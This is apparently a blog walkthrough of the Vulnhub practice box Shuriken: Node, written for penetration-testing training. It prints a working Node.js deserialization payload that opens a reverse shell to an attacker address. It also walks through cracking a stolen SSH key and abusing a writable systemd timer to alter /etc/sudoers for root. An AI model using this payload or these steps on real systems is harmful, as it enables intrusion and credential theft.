---
layout: post
title: "Shuriken: Node"
date: 2021-03-07
ctf: true
excerpt: "Walkthrough for Shuriken: Node on Vulnhub"
tags: [privilege escalation, Node.js deserialization, Linux service abuse]
comments: false


---


# Shuriken: Node

Shuriken:Node is a recently released box on [Vulnhub](https://www.vulnhub.com/entry/shuriken-node,628/) by TheCyb3rW0lf. It is rated as an easy/medium difficulty box. Below are some hints if you get stuck and a full walkthrough for this box. 

Click on the title to expand each section below.

## Hints
<details><summary><strong>Initial Foothold Hints</strong></summary>
<ul>
    <li>What technologies are being utilized on the main website?
    <li>Are there any vulnerabilities for this technology?
</ul>
</details>

<details><summary><strong>Lateral Movement Hints</strong></summary>
<ul>
    <li>Enumeration is very beneficial.
    <li>What other port was open besides the website's port?
    <li>What would you need to be able to connect with this service without a password?
</ul>
</details>

<details><summary><strong>Root Privilege Escalation Hints</strong></summary>
<ul>
    <li>What can the 2nd user run as sudo?
    <li>Is there a way this could be abused?
</ul>
</details>

## Walkthrough

<details><summary><strong>Full Walkthrough</strong></summary>
First, once imported, I run the following to discover the IP address of the system:

**`netdiscover -i eth0`**

![Shuriken - netdiscover](/assets/img/Shuriken1.png)

Next, I use:

**`threader3000`**

and input the system's IP address when prompted to uncover which ports are open on the system. Once completed, I let it run it's suggested nmap scan as well.

![Shuriken - threader3000](/assets/img/Shuriken2.png)

It appears that both SSH and a website are open. Let's visit the website on port 8080 by navigating to **http://\<target IP\>:8080** in our browser.

It appears that this company was recently the victim of a data breach.

![Shuriken - website1](/assets/img/Shuriken3.png)

 Scrolling further down there is a mention of a Node.js vulnerability. Node.js is being utilized as shown in the above nmap scan. Let's see if they are utilizing a vulnerable version.

![Shuriken - website2](/assets/img/Shuriken4.png)

Digging into this further, I uncovered that there was a cookie with a URL encoded value stored for my session:

![Shuriken - cookie](/assets/img/Shuriken5.png)

I used [CyberChef](https://gchq.github.io/CyberChef/) to URL Decode this value. This appeared to return a base64 encoded string. I then decoded this value as base64, which returned the following:



![Shuriken - decode cookie](/assets/img/Shuriken6.png)



Let's see if we can modify these cookie values and see if we're able to login as an administrator. I tested by changing the "username" value to admin and "isGuest" to false. I then reencoded the string as base64/URL encoding.

![Shuriken reencode cookie](/assets/img/Shuriken7.png)

Let's reload the page and see what happens.

![Shuriken revisit webpage](/assets/img/Shuriken8.png)

It appears that this updated the username to "admin", but we still need to login. Let's try a deserialization attack and insert a reverse shell into the cookie. Luckily, a sample script is available [here](https://raw.githubusercontent.com/ajinabraham/Node.Js-Security-Course/master/nodejsshell.py). Let's run it as follows:

**`python nodejsshell.py <attacker ip> <attacker port>`**

![Shuriken nodejsshell.py](/assets/img/Shuriken9.png)

There's some additional steps that need to occur in order to properly get this to work. The following [site](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/) provides a good example of what the values need to be set to. Essentially, the cookie needs to be replaced with something similar to the following:

**`{"rce":"_$$ND_FUNC$$_function (){<insert code from nodejsshell.py>}()"}`**

In this particular example, the code looks like the following:

**`{"rce":"_$$ND_FUNC$$_function (){ eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,
114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,
114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,
97,119,110,59,10,72,79,83,84,61,34,49,57,50,46,49,54,56,46,49,46,49,57,50,34,59,10,80,79,82,84,61,34,
52,53,54,55,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,
111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,
115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,
112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,
111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,
102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,
79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,
119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,
110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,
10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,
115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,
34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,
116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,
115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,
115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,
32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,
100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,
101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,
32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,
114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,
115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,
84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))}()"}`**

Let's reencode this to base64 and then URL encoding with CyberChef. Place the output of the script above in the "username" field.

![Shuriken modify cookie](/assets/img/Shuriken10.png)

Next, before we update the cookie value, let's create a netcat listener on our attacker pc. This can be done with:

**`nc -nvlp <port>`** 

where the port used is the one utilized in the nodejsshell.py script above.

![Shuriken nc listener](/assets/img/Shuriken11.png)



Next, modify this cookie value (in developer tools) and reload the webpage.

![Shuriken modify cookie value](/assets/img/Shuriken13.png)

If you look at your terminal window with netcat running, you should have an initial foothold on this system! 

![Shuriken initial foothold](/assets/img/Shuriken14.png)

Let's see how we can upgrade our shell. First, let's run:

**`which python`**

This returns a result, **/usr/bin/python** which lets us know that python is locally installed. Let's run

**`python -c 'import pty; pty.spawn("/bin/bash")'`** to upgrade our shell.

![Shuriken upgrade shell](/assets/img/Shuriken15.png)

Next, let's get linpeas onto this server by hosting it on our attacker host. This can be done by running the following command in another terminal window:

**`python3 -m http.server 8080`**

![Shuriken python3 http.server](/assets/img/Shuriken16.png)

Next, on the victim host, run the following commands to download the linpeas.sh script and make it executable:

**`cd /tmp`**

**`wget http://<attacker ip>:8080/linpeas.sh`**

**`chmod +x ./linpeas.sh`**

![Shuriken linpeas download](/assets/img/Shuriken17.png)

Next, run:

 **`./linpeas.sh`**

and review the output for privilege escalation methods. It appears that there is a backup of some SSH keys in  the /var/backups directory as shown below:



![Shuriken ssh-key.zip](/assets/img/Shuriken18.png)

Let's navigate to this directory with:

**`cd /var/backups`**

and run 

**`ls -al`** to view permissions on this file:

![Shuriken ssh-backup.zip permissions](/assets/img/Shuriken19.png)

It appears we have read only access to this file. Let's copy it to our current user's home directory with: 

**`cp ssh-backup.zip ~/`**

![Shuriken copy ssh-backup.zip file](/assets/img/Shuriken20.png)

Next, let's navigate to our user's home directory with:

**`cd ~`**

and then run: 

**`unzip ssh-backup.zip`**

This will inflate the id_rsa file, which is a private key for what is presumed to be the serv-adm user.

![Shuriken inflate ssh-backup file](/assets/img/Shuriken21.png)

We need to extract the public key, so in order to do so, we need to copy this file over to our attacker host. We know that python is installed so let's start a server with: 

**`python -m SimpleHTTPServer 9000`**

![Shuriken python SimpleHTTPServer](/assets/img/Shuriken22.png)

On our attacker host, let's run the following command:

**`wget http://<victim ip>:9000/id_rsa`**

![Shuriken save id_rsa](/assets/img/Shuriken23.png)

Next, let's change the permissions on this file to 600 with:

**`chmod 600 id_rsa`**

Next, let's convert this to a format that can be cracked with john with:

**`/usr/share/john/ssh2john.py id_rsa crackme`**

![Shuriken ssh2john](/assets/img/Shuriken24.png)

Next, let's run john with the following:

**`john crackme --wordlist=/usr/share/wordlists/rockyou.txt`**

This will return a password relatively quickly:

![Shuriken john ssh password](/assets/img/Shuriken25.png)

Now, let's SSH in and attempt to do it as the serv-adm user with:

**`ssh -i id_rsa serv-adm@<victim ip>`** 

When prompted for the password, enter the one that was cracked by john.

![Shuriken serv-adm access](/assets/img/Shuriken27.png)

Awesome, we now have access as the serv-adm user. Let's see if they have access to any root level permissions with:

**`sudo -l`**

![Shuriken serv-adm sudo -l](/assets/img/Shuriken28.png)

It looks like we have access to start/stop a service named shuriken-auto.timer. Let's run:

**`locate shuriken-auto.timer`** 

to find the folder this service is saved in

![Shuriken locate shuriken-auto.timer](/assets/img/Shuriken29.png)

Let's navigate to this folder with:

**`cd /etc/systemd/system/`**

and run:

**`ls -al|grep shuriken`**

![Shuriken view shuriken-auto.timer permissions](/assets/img/Shuriken30.png)

It appears we have the ability to modify this job and timer! Let's delete what's in there and modify the timer settings to:

**`OnCalendar=*:0/1`**

![Shuriken edit timer](/assets/img/Shuriken31.png)

Next, let's run:

**`nano shuriken-job.service`**

and change the [Service] section to what is shown in the screenshot below:

![Shuriken edit service](/assets/img/Shuriken32.png)

Once saved, navigate to the tmp directory with:

**`/cd/tmp`**

followed by:

**`nano test.sh`**

and enter the following:

**`#!/bin/bash`**

**`chmod 777 /etc/sudoers`**

![Shuriken modify sudoers](/assets/img/Shuriken33.png)

Next, let's make this script executable with:

**`chmod +x test.sh`**

![Shuriken chmod +x test.sh](/assets/img/Shuriken34.png)

Let's stop/start and reload the daemon by running the following:

**`sudo /bin/systemctl stop shuriken-auto.timer`**

**`sudo /bin/systemctl start shuriken-auto.timer`**

**`sudo /bin/systemctl daemon-reload`**

After a minute, the /etc/sudoers file should be world writeable:

![Shuriken sudoers permission change](/assets/img/Shuriken35.png)

Let's run:

**`nano /etc/sudoers`** 

and modify it so the serv-adm user can run bash as root by adding in the following:

**`serv-adm ALL=(ALL)NOPASSWD: /bin/bash`**

![Shuriken modify /etc/sudoers](/assets/img/Shuriken36.png)

Save and exit this file.

Next, we need to modify the permissions on /etc/sudoers back to 440 or else it will not work properly. Let's run **nano test.sh** and change the permissions to 440 in this script.

![Shuriken revert /etc/sudoers permissions](/assets/img/Shuriken37.png)

After a minute, the permissions should revert back to the appropriate level.

![Shuriken sudoers file permissions reverted](/assets/img/Shuriken38.png)

Now, let's run:

**`sudo /bin/bash`**

which should give you root access. Follow this up with:

**`cd /root`**

and

**`cat root.txt`**

to finish this box!

![Shuriken rooted](/assets/img/Shuriken39.png)

</details>
